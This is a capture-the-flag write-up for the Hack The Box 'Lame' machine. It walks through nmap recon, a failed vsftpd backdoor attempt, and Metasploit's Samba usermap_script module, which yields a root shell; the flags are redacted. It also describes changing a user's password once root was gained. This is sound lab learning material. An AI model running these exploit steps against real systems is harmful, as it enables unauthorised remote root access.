**Lame** is a retired **Easy** Linux box on Hack The Box. It's one of the
oldest machines on the platform and a great first target. I found that the main premise of the box
was a single exploit, however there were other ways of conquering the box.

- **Target:** `10.129.80.132`
- **OS:** Linux (Debian / Ubuntu, Samba `hackthebox.gr`)
- **Difficulty:** Easy

---

## Recon

Started with a full TCP port scan with version detection and default scripts:

```bash
nmap -sV -sC -oA lame -p- --min-rate 1000 10.129.80.132
```

- `-sV` — service/version detection (the version strings are the whole game)
- `-sC` — default NSE scripts
- `-p-` — all 65,535 ports (not just the top 1000)
- `-oA lame` — save output in all formats (needed for notes/reporting later)

![Nmap full port scan output](nmap-scan.png)
_Full TCP scan revealing five open ports._

Five open ports, four services that caught my eye:

| Port | Service | Version |
|------|---------|---------|
| 21   | ftp     | vsftpd 2.3.4 (anonymous login allowed) |
| 22   | ssh     | OpenSSH 4.7p1 Debian |
| 139  | netbios-ssn | Samba smbd 3.X–4.X |
| 445  | netbios-ssn | Samba smbd 3.0.20-Debian |
| 3632 | distccd | distccd v1 |

## Enumeration & Dead Ends

Before deciding how to pwn this box, I chased each lead from the nmap scan of which services were open/running, starting with anonymous FTP login to see if anything was there.

### FTP — anonymous login (empty)

The scan flagged anonymous FTP, so I logged in to check it:

```bash
ftp 10.129.80.132
# Name: anonymous
# Password: (blank)
```

Login succeeded (`230 Login successful`), but the share was empty, only `.`
and `..`, and not writable:

```
drwxr-xr-x  2 0  65534  4096 Mar 17 2010 .
drwxr-xr-x  2 0  65534  4096 Mar 17 2010 ..
```

**Result:** anonymous FTP ruled out as a foothold.

### FTP — vsftpd 2.3.4 backdoor (no session)

I then pivoted to the vsftpd v. 2.3.4 running and checked searchsploit for potential exploits.

`searchsploit` I tested the backdoor command execution exploit for this version of vsftpd

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.80.132
run
```

Metasploit reported the banner *looked* vulnerable, then failed:

```
[+] The target appears to be vulnerable. vsftpd 2.3.4 banner detected
[!] Unable to connect to backdoor on 6200/TCP. Cooldown?
[*] Exploit completed, but no session was created.
```

## Foothold — Samba `usermap_script` (root)

`searchsploit samba 3.0.20` returned several results. Reading them against the
target version (3.0.20):

- *Samba 3.0.10 < 3.3.5 Format String / Security Bypass*
- **Samba 3.0.20 < 3.0.25rc3 'Username map script' Command Execution**, in range, command execution, reliable
- *Samba < 3.0.20 Remote Heap Overflow*, out of range (we're **not** below 3.0.20)
- *Samba < 3.6.2 Denial of Service*, useless for access

The **username map script** vuln is what I ended up using from metasploit.

```
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.80.132
set LHOST tun0
run
```

The session opens as a raw shell with no prompt.

```
whoami
# root
id
# uid=0(root) gid=0(root)
```

![Root shell — whoami returns root](root-shell.png)
_Command shell session opened as root via the Samba usermap_script module._

> `LHOST` must be your VPN address (`tun0`, e.g. `10.10.x.x`), **not** your
> local `eth0`. The target can only reach you through the VPN tunnel.
> `set LHOST tun0` lets Metasploit resolve it for you.

## Flags

### Root flag

```
cat /root/root.txt
# <REDACTED>
```

### User flag

Since the shell was already **root**, the user flag was readable directly:

```
cat /home/makis/user.txt
# <REDACTED>
```

![Both flags captured](flags.png)
_Root and user flags._

> **What I actually did:** I found the `makis` account in `/etc/passwd`,
> changed its password, and logged in as the user to read the flag. It worked, but was redundant as I could already read the file as root. Changing a user's password also alters `/etc/shadow`, locks the real
> user out, and leaves obvious evidence in logs. **Privilege flows downward; root already
> contains every user's access, so there's never a need to *become* a lower
> user to read their files.**
{: .prompt-info}
